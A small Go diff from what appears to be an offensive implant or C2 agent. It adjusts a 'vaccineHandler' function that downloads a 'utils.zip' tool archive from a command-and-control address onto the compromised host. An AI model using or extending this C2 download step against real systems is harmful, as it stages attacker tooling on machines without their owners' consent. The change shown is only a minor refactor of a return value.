@@ -14,7 +14,7 @@ import (
 
 func vaccineHandler() string {
 	log.Printf("Downloading utils.zip from %s", CCAddress+"utils.zip")
-	err := DownloadViaCC(CCAddress+"utils.zip", AgentRoot+"/utils.zip")
+	_, err := DownloadViaCC(CCAddress+"utils.zip", AgentRoot+"/utils.zip")
 	out := "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
